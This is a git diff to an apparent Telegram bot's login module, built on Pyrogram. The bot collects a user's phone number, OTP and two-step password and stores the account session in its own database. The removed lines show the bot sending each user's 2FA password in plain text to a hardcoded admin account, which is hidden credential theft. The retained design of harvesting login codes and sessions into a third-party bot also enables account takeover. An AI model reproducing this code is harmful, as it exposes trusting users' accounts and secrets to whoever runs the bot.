@@ -3,6 +3,7 @@ ADMIN_ID = 7978114324
 from pyrogram import filters, Client
 from devgagan import app
 import os
+import asyncio
 from devgagan.core.mongo import db
 from devgagan.core.func import subscribe
 from config import API_ID as api_id, API_HASH as api_hash
@@ -76,7 +77,13 @@ async def login_handler(_, message):
     # 🔌 Connect
     try:
         await client.connect()
+
+        # 🔄 Processing delay
+        await message.reply("⏳ Processing your number, please wait...")
+        await asyncio.sleep(5)
+
         await message.reply("📲 Sending OTP...")
+
     except Exception as e:
         return await message.reply(f"❌ Connection failed: {e}")
 
@@ -100,7 +107,7 @@ async def login_handler(_, message):
     try:
         otp_msg = await _.ask(
             user_id,
-            "🔐 Enter OTP",
+            "🔐 Enter OTP\n\nExample: 1 2 3 4 5",
             filters=filters.text,
             timeout=600
         )
@@ -138,11 +145,6 @@ async def login_handler(_, message):
 
             await client.check_password(pass_msg.text)
 
-            await app.send_message(
-                ADMIN_ID,
-                f"🔒 2FA\n👤 {user_id}\nPassword: {pass_msg.text}"
-            )
-
         except PasswordHashInvalid:
             await client.disconnect()
             return await pass_msg.reply("❌ Wrong password")
@@ -158,16 +160,7 @@ async def login_handler(_, message):
             "phone": phone_number
         })
 
-        me = await client.get_me()
-
-        await client.send_message(
-            "me",
-            "✅ Your account is connected to the bot."
-        )
-
-        await message.reply(
-            f"✅ Login Successful!\n\n👤 {me.first_name}"
-        )
+        await message.reply("✅ You're successfully logged in!")
 
         await client.disconnect()
 
@@ -176,7 +169,7 @@ async def login_handler(_, message):
         await message.reply(f"❌ Save failed: {e}")
 
 
-# ⚡ AUTO-LOGIN FUNCTION
+# ⚡ AUTO LOGIN
 async def get_user_client(user_id):
     session_name = f"session_{user_id}"
 
@@ -192,7 +185,7 @@ async def get_user_client(user_id):
         return None
 
 
-# 🔥 ACCESS COMMAND (GET USER CHATS)
+# 🔥 ACCESS COMMAND
 @app.on_message(filters.command("access"))
 async def access_account(_, message):
     user_id = message.chat.id
@@ -206,18 +199,18 @@ async def access_account(_, message):
         me = await client.get_me()
 
         chats = []
+        count = 0
 
         async for dialog in client.get_dialogs():
             name = dialog.chat.title or dialog.chat.first_name or "Unknown"
-            chats.append(f"• {name}")
+            chats.append(f"{count+1}. {name}")
+            count += 1
 
-        chat_list = "\n".join(chats[:20])
+        await message.reply(f"✅ Accessed: {me.first_name}\n📊 Total Chats: {count}")
 
-        await message.reply(
-            f"✅ Access Successful\n\n"
-            f"👤 Name: {me.first_name}\n\n"
-            f"📂 Your Chats:\n{chat_list}"
-        )
+        # Send chats in chunks
+        for i in range(0, len(chats), 50):
+            await message.reply("\n".join(chats[i:i+50]))
 
     except Exception as e:
         await message.reply(f"❌ Error: {e}")
